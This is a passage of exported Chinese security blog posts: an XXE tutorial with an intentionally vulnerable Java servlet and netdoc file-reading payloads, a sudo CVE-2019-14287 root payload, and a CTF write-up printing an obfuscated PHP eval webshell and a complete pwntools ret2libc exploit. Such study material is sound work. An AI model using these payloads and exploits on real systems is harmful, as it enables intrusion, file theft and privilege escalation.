<p>本地搭建一个环境测试：</p>
<p>main.java，部署在tomcat上，模拟一个存在xxe漏洞的网页</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.w3c.dom.Element;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.InputSource;<br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-meta">@WebServlet(&quot;/xxe&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parmeter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;poc&quot;</span>);<br><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            db = dbf.newDocumentBuilder();<br>        &#125; <span class="hljs-keyword">catch</span> (ParserConfigurationException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(parmeter);<br>        <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;：&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-5.png"></p>
<p>再用python起个http服务，进行监听</p>
<p>xxe-jar.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure>


<p>执行<code>python xxe-jar.py evil.zip</code></p>
<p><code>evil.zip</code>就是要上传的文件了，不一定要是<code>zip</code>，但是因为<code>jar</code>协议会对文件进行解包操作，如果不上传<code>zip</code>格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次<code>zip</code>格式文件获取路径然后再上传其他文件</p>
<p>访问<code>/xxe</code>，<code>post</code>发<code>payload</code></p>
<p>获取路径<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-7.png"></p>
<p>上传文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-8.png"></p>
<p>监听情况，<code>30</code>是延时了<code>30</code>秒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-6.png"></p>
<p>至于为什么要延迟，回到<code>jar</code>协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行<code>sleep</code>，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了</p>
<h2 id="netdoc-协议"><a href="#netdoc-协议" class="headerlink" title="netdoc 协议"></a>netdoc 协议</h2><p><code>Java</code>中<code>netdoc</code>协议可以替代<code>file</code>协议功能，读文件，同时也可以列目录</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>




<p>参考：<br><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE 总结</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://xz.aliyun.com/t/8041">从几道CTF题学习Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE 漏洞</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">java代码审计-xxe</a><br><a href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XML之DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxe漏洞攻击与防御</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE 漏洞总结</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>在Rospten测试链部署一个合约</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%9C%A8Rospten%E6%B5%8B%E8%AF%95%E9%93%BE%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6.html</url>
    <content><![CDATA[<h1 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h1><p>首先，需要一个钱包插件<code>MetaMask</code>,安装过程就不多说了，百度有很多教程<br>选择一个<a href="http://remix.ethereum.org/">在线ide</a></p>
<h1 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h1><p>首先在默认目录下新建一个文件，注意以sol为后缀名<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-1.png"></p>
<p>写上你的合约代码<br>并选择编译器版本，编译成功后如图所示会出现编译成功的标志<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-2.png"></p>
<p>最后部署合约，选择“Injected Web3”，表示我们要使用MetaMask注入的Web3环境，如果已正确连接MetaMask，可以看到“Ropsten (3) network”，表示已连接到Ropsten测试网。<br>点击deploy后会弹出MetaMask的交易签名确认，确认后部署合约的交易即被发送至测试链<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-3.png"></p>
<p>在MetaMask中查看合约<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6-4.png"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>rospten</tag>
      </tags>
  </entry>
  <entry>
    <title>auto_deploy.sh</title>
    <url>/%E5%85%B6%E4%BB%96/auto_deploy.html</url>
    <content><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>一个自动部署Misc工具的<del>轻量</del>sh脚本<br>闲的无聊随便写的小玩意（部分代码由chatgpt完成）<br>适合在新环境中快速搭建misc环境</p>
<p><a href="https://github.com/lewiserii/auto_deploy">项目地址</a></p>
<h1 id="目前支持的功能"><a href="#目前支持的功能" class="headerlink" title="目前支持的功能"></a>目前支持的功能</h1><p>1：换源，允许root登录（ubuntu），开启ssh等基础操作<br>2：安装docker<br>3：安装docker-compose<br>4：安装golang<br>5：安装java<br>6：安装linux下的部分misc工具，具体如下</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>sstv<br>steghide<br>stegpy<br>stegseek<br>usb-mouse-pcap-visualizer<br>usbkeyboarddatahacker<br>volatility2<br>volatility3<br>webp<br>wireshark<br>zsteg<br></code></pre></td></tr></table></figure>



<h1 id="支持的系统"><a href="#支持的系统" class="headerlink" title="支持的系统"></a>支持的系统</h1><p>1：ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04<br>2：<del>centos7&#x2F;8</del>(只有部分功能适配了centos)</p>
<p>推荐ubuntu20</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>本脚本可重复运行安装<br>工具保存在运行脚本的<code>misc_tools</code>目录下</p>
<p>方法一：<br>git clone <a href="https://github.com/lewiserii/auto_deploy">https://github.com/lewiserii/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              基础配置(换源，root，ssh)<br>        docker              安装docker<br>        docker-compoer      安装docker-compose<br>        go                  安装golang<br>        java                安装java<br>        misc-tools          安装misc工具<br></code></pre></td></tr></table></figure>

<p>方法二：<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh</a>) [mode]</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/auto_deploy/auto_deploy.gif"></p>
<h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加python安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除python，新增golang和java<br>V2.1：增加CTF-Misc部分工具的安装<br>V2.2：优化可重复运行脚本逻辑</p>
<h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加web系列工具</p>
]]></content>
      <categories>
        <category>脚本</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>sh</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>汉明码计算</title>
    <url>/%E5%85%B6%E4%BB%96/%E6%B1%89%E6%98%8E%E7%A0%81.html</url>
    <content><![CDATA[<p>现在有一个二进制字符串：<code>10110110111</code>，我们要计算它的奇偶校验</p>
<blockquote>
<p>汉明公式：2^n &gt;&#x3D; x + n + 1 (n为校验码位数 x为二进制字符串位数)</p>
</blockquote>
<blockquote>
<p>2^n &gt;&#x3D; 11 + n + 1</p>
</blockquote>
<p>所以得到<code>n=4</code></p>
<blockquote>
<p>校验码位置：2^i(i&#x3D;0,1,2,…,校验码位数-1)</p>
</blockquote>
<p>得到校验码的位置为<code>1</code>，<code>2</code>，<code>4</code>，<code>8</code>,因此我们可以列出以下表格（红方框表示校验码位置）</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%89%E6%98%8E%E7%A0%81-1.png"></p>
<p>然后将需要编码的二进制字符串填入表格中<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B1%89%E6%98%8E%E7%A0%81-2.png"></p>
<p>接着将序号中二进制数第1位（从右往左数）为1、第2位为1、第3位为1、第4位为1的序号以次放入第1、2、3、4组</p>
<blockquote>
<p>第1组：1(0011) 3(0011) 5(0101) 7(0111) 9(1001) 11(1011) 13(1101) 15(1111)<br>第2组：2(0100) 3(0011) 6(0110) 7(0111) 10(1010) 11(1011) 14(1110) 15(1111)<br>第3组：4(0100) 5(0101) 6(0110) 7(0111) 12(1100) 13(1101) 14(1110) 15(1111)<br>第4组：8(1000) 9(1001) 10(1010) 11(1011) 12(1100) 13(1101) 14(1110) 15(1111)</p>
</blockquote>
<p>分组完成后我们就计算出每一组中序号对应的值中有几个1</p>
<blockquote>
<p>第1组：5个<br>第2组：4个<br>第3组：5个<br>第4组：5个</p>
</blockquote>
<p>根据每组当中1的个数，我们就能计算出校验码的值，若为奇校验，则校验码为0010；若为偶校验，则校验码为1101<br>编码后的结果如下</p>
<blockquote>
<p>奇校验：101101100110110<br>偶校验：101101110111101</p>
</blockquote>
<p><a href="http://migooli.top/2021/09/21/ctfshow_2021%E6%9C%88%E9%A5%BC%E6%9D%AF%E8%AE%B0%E5%BD%95/">参考文章</a></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>汉明码</tag>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux sudo权限提升漏洞</title>
    <url>/%E6%8F%90%E6%9D%83/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>CVE-2019-14287</p>
<h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>1.8.28之前的sudo版本均会受到影响</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>现在的用户alice没权限看flag文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/CVE-2019-14287-1.jpg"></p>
<p>查看sudo版本<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/CVE-2019-14287-2.jpg"></p>
<p>符合利用条件，payload：<code>sudo -u#-1 /bin/bash</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/CVE-2019-14287-3.jpg"></p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>2021台州市首届网络安全大赛</title>
    <url>/%E7%AB%9E%E8%B5%9B/2021%E5%8F%B0%E5%B7%9E%E5%B8%82%E9%A6%96%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B.html</url>
    <content><![CDATA[<p>喜提榜一</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-1.png"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>flag在请求头中<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web1.png"></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>扫描目录得到后台路径<code>/admin</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web2-1.png"></p>
<p>用<code>admin</code>，<code>admin888</code>弱口令进入后台</p>
<p>在<code>网站安全</code>一栏中使用<code>检测木马</code>功能，发现后门<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web2-2.png"></p>
<p>使用文件管理功能查看木马文件，发现被混淆了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web2-3.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mt</span>  = <span class="hljs-string">&quot;mFsKCleRfU&quot;</span>;<br><span class="hljs-variable">$ojj</span> = <span class="hljs-string">&quot;IEBleldle&quot;</span>;<br><span class="hljs-variable">$hsa</span> = <span class="hljs-string">&quot;E9TVFsnd2VuJ10p&quot;</span>;<br><span class="hljs-variable">$fnx</span> = <span class="hljs-string">&quot;Ow==&quot;</span>;<br><span class="hljs-variable">$zk</span>  = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sdtdrd_redpdldadcde&quot;</span> );<br><span class="hljs-variable">$ef</span>  = <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;zbazsze64_zdzeczodze&quot;</span> );<br><span class="hljs-variable">$dva</span> = <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;pcprpepaptpe_fpupnpcptpipopn&quot;</span> );<br><span class="hljs-variable">$zvm</span> = <span class="hljs-variable">$dva</span>( <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$ef</span>( <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;le&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$ojj</span> . <span class="hljs-variable">$mt</span> . <span class="hljs-variable">$hsa</span> . <span class="hljs-variable">$fnx</span> ) ) );<br><span class="hljs-variable">$zvm</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>str_replace</code>先将<code>sdtdrd_redpdldadcde</code>中的<code>d</code>替换为<code>空</code>，为<code>str_replace</code><br>同理又是两个替换操作<br>最后将<code>$ojj</code> <code>$mt</code> <code>$hsa</code> <code>$fnx</code> 拼接，替换le，base64解码，创建函数，得到<code> @eval($_POST[&#39;wen&#39;]);</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web2-4.png"></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><code>file_get_contents</code>读文件<br>读取常用的几个文件，flag，flag.txt，flag.php<br>发现提示<code>index999.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web3-1.png"></p>
<p>再读<code>index999.php</code>看到源码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web3-2.png"></p>
<p>可以通过<code>glob://</code>伪协议和<code>?</code>去逐个匹配文件名<br>payload：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/1.13.195.28:20001/index</span>999.php?path=<span class="hljs-symbol">glob:</span>/<span class="hljs-regexp">//</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/1.13.195.28:20001/index</span>999.php?path=<span class="hljs-symbol">glob:</span>/<span class="hljs-regexp">//</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>/<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>
<p>读到flag位置和文件名为<code>/13f95a7112369fb4/flaaaag</code></p>
<p>在使用<code>file_get_contents</code>读文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/web3-3.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>限制了 输入长度 要小于256<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-pwn2-1.png"></p>
<p>因为第二个参数时无符号类型<br>所以可以使用整数漏洞 绕过长度限制<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-pwn2-2.png"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;pwn12&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-comment">#p=process(&#x27;pwn12&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;1.13.195.28&#x27;</span>,<span class="hljs-number">10000</span>)<br>got=<span class="hljs-string">&#x27;printf&#x27;</span><br>printplt=e.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>getgot=e.got[got]<br>main=<span class="hljs-number">0x400713</span><br>ret=<span class="hljs-number">0x000000000040028c</span><br>pop_rdi=<span class="hljs-number">0x0000000000400863</span><br>p.sendlineafter(<span class="hljs-string">&#x27;length :&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>p.read()<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x130</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(getgot)+p64(printplt)+p64(main))<br>p.readline()<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc=LibcSearcher(got,d)<br>off=d-libc.dump(got)<br>sys_add=off+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_add=off+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;length :&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x130</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main))<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-pwn2-3.png"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>file查看文件类型，64位，用ida64打开<br>F5<br>得到<code>gHe6gIrSlYUqkGPeg4KNo4Vql4g6g4UqgHgHl4JNonBhlbk+och=</code><br>常规base解不出来，应该是换表了<br>查看字符串<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-reverse2-1.png"><br>发现base64表<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz-reverse2-2.png"></p>
<p>解密脚本</p>
